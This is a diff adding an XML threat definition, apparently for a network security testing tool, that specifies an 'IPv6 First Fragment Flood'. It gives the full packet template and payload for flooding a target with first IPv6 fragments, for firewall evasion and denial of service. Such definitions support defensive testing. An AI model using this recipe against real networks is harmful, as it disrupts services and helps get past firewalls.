@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IPv6 First Fragment Flood"/>
+    <EngDesc display="true" value="This threat sends multiple IPv6 fragments belonging to the same ID.  Each fragment has the more fragments bit set, and represents the first fragment in the sequence.  This can be used for firewall evasion and causing a denial of service in IPv6 fragment reassembly algorithms."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Evasion"/>
+      <item value="Fragmentation"/>
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="IPv6"/>
+    <Type_Of_Equipment display="true" value="Protocol"/>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID value="000001060fde83c500c000a80001003c65b2250c" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <Suite display="true" value="Standard"/>
+    <AccessVector value="remote"/>
+    <AccessComplexity value="low"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="none"/>
+    <IntegImpact value="none"/>
+    <AvailImpact value="partial"/>
+    <ImpactBias value="normal"/>
+    <Created value="1139462138" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIPv6" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destIPv6" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="86DD">
+      <IPv6 Version="6" Priority="0" Flow-Label="0" Payload-Length="31" Next-Header="2c" Hop-Limit="FF" Source-Address="$sourceIPv6" Destination-Address="$destIPv6" Payload="3A00000112345678AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
